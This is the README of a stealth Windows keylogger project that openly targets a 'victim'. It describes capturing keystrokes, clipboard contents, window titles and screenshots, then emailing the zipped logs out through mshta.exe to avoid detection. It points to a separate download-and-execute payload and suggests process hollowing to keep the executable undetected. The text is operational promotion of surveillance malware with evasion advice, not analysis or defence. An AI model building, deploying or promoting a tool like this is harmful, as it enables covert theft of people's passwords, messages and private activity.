# xs8Keylogger

Stealth Low-Level Hook Keylogger (Captures also the victim screen!)

## Features
●Compresses everything in a *zip archive* (you can also set a password)
<br/>
●The archive is sended to you by e-mail using a **trusted Windows** process (*mshta.exe*)
<br/>
●*Screenshot* of the *screen* when the left mouse button is pressed
<br/>
●**Dead keys** support
<br/>
●*Unicode* characters support
<br/>
●Captures the title of the **focused** window
<br/>
●Reads the **clipboard** when *CTRL+C* or *CTRL+V* are pressed
 <br/><br/>
### Prerequisites
You need to *configure* the [MSHTA VBScript Download & Execute](https://github.com/Xxshark888xX/MSHTA-VBS-download-and-execute) payload to can launch the [sendEmail.vbs](src/sendEmail.vbs) payload using *cmd.exe* (through the keylogger process)
 <br/><br/>
You will also need to add this two files to your project
<br/>
## Zip by *Lucian Wischik*
http://www.wischik.com/lu/programmer/zip_utils.html
<br/>
## base64 by *René Nyffenegger*
https://renenyffenegger.ch/notes/development/Base64/Encoding-and-decoding-base-64-with-cpp
<br/><br/>
## Warning
I have tested it only launching with the **Process Hollowing** technique, so I don't know if the exe is FUD or not.<br/>
A good start point to Process Hollowing [here](http://www.rohitab.com/discuss/topic/40262-dynamic-forking-process-hollowing/)
## License
See the [LICENSE](LICENSE) file for details
<br/><br/>
:warning: **This program was written only as a personal challenge. I don't assume any responsibility about how you will use.** :warning:
